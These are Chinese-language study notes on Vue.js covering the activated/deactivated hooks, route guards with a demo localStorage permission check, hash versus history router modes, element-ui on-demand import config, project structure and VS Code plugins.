### 两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。（在生命周期图中没有体现的钩子：nexttick，加下面两个）
2. 具体名字：
	1. ```activated```路由组件被激活时触发。
	2. ```deactivated```路由组件失活时触发。

```vue
		/* beforeDestroy() {
			console.log('News组件即将被销毁了')
			clearInterval(this.timer)
		}, */
		/* mounted(){
			this.timer = setInterval(() => {
				console.log('@')
				this.opacity -= 0.01
				if(this.opacity <= 0) this.opacity = 1
			},16)
		}, */
		activated() {
			console.log('News组件被激活了')
			this.timer = setInterval(() => {
				console.log('@')
				this.opacity -= 0.01
				if(this.opacity <= 0) this.opacity = 1
			},16)
		},
		deactivated() {
			console.log('News组件失活了')
			clearInterval(this.timer)
		},
```

> 用于对于不想销毁的组件中的部分需要销毁的内容，在这两个生命周期钩子中进行操作。



### 路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

	```js
	//全局前置守卫：初始化时执行、每次路由切换前执行
	router.beforeEach((to,from,next)=>{
		console.log('beforeEach',to,from)
		if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
			if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
				next() //放行
			}else{
				alert('暂无权限查看')
				// next({name:'guanyu'})
			}
		}else{
			next() //放行
		}
	})
	
	//全局后置守卫：初始化时执行、每次路由切换后执行
	router.afterEach((to,from)=>{
		console.log('afterEach',to,from)
		if(to.meta.title){ 
			document.title = to.meta.title //修改网页的title
		}else{
			document.title = 'vue_test'
		}
	})
	```

4. 独享守卫:

	```js
	beforeEnter(to,from,next){
		console.log('beforeEnter',to,from)
		if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
			if(localStorage.getItem('school') === 'atguigu'){
				next()
			}else{
				alert('暂无权限查看')
				// next({name:'guanyu'})
			}
		}else{
			next()
		}
	}
					{
						name:'xinwen',
						path:'news',
						component:News,
						meta:{isAuth:true,title:'新闻'},
						beforeEnter: (to, from, next) => {
							console.log('独享路由守卫',to,from)
							if(to.meta.isAuth){ //判断是否需要鉴权
								if(localStorage.getItem('school')==='atguigu'){
									next()
								}else{
									alert('学校名不对，无权限查看！')
								}
							}else{
								next()
							}
						}
					},
	
	```

5. 组件内守卫：

	```js
	//进入守卫：通过路由规则，进入该组件时被调用
	beforeRouteEnter (to, from, next) {
	},
	//离开守卫：通过路由规则，离开该组件时被调用
	beforeRouteLeave (to, from, next) {
	}
	```



### 路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
	1. 地址中永远带着#号，不美观 。
	2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
	3. 兼容性较好。
4. history模式：
	1. 地址干净，美观 。
	2. 兼容性和hash模式相比略差。
	3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。
	4. nodeJs 可以通过使用 [connect-history-api-fallback](https://www.npmjs.com/package/connect-history-api-fallback) 第三方库进行配置。







# element-ui

**vue UI 组件库**

1. 移动端常用 UI 组件库

	1. Vant https://youzan.github.io/vant

	2. Cube UI https://didi.github.io/cube-ui

	3. Mint UI http://mint-ui.github.io

2. PC 端常用 UI 组件库

	1. Element UI https://element.eleme.cn

	2. IView UI https://www.iviewui.com



babel.config.js 文件（按需引入配置）：

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
		["@babel/preset-env", { "modules": false }],
  ],
	plugins:[
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```





# vue3

<img src="https://user-images.githubusercontent.com/499550/93624428-53932780-f9ae-11ea-8d16-af949e16a09f.png" style="width:200px" />





# vue 项目文件结构

```
|-- 
    |-- App.vue
    |-- main.js
    |--	public
    |-- src
    |   |-- components
    |   	|-- Student.vue(存放一般组件)
    |   	|-- Person.vue
    |	|-- router
    |    	|-- index.js(配置路由规则)
    |	|-- pages
    |		|-- About.vue(存放路由页面组件，靠路由规则是否展示)
    |	|-- store(vue)
    |		|-- index.js(数据集中状态管理，总文件，可以将不同组件的状态管理存在不同的文件中，导入并注册)
    |		|-- Count.js
    |		|-- ...
    |
    
|-- dist(打包后的前端文件，将所有的前端组件文件打包后生成的 html/css/js 文件，放在服务器中作为静态资源(static))
```











# vscode中 vue 插件推荐

1. vue3 snippets

2. vetur：让 VSCode 可以识别 .vue 文件，快速构建模板：打一个左尖括号和一个 v 就可以 tab

3. Open in External App：可以在 vscode 中右键文件快速使用外部打开某个文件，如在外部使用 Typora 打开 .md 文件
4. 
